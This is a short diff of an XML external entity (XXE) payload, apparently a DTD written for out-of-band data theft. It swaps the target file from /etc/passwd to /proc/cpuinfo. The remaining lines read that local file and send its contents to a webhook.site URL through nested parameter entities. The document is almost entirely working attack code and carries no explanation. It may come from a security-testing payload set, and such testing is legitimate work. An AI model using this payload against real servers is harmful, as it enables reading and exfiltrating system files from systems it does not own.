@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///proc/cpuinfo">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/4b900880-be0f-4dd0-ae2f-6bb534644936?x=%file;'>">
 %eval;
 %exfiltrate;
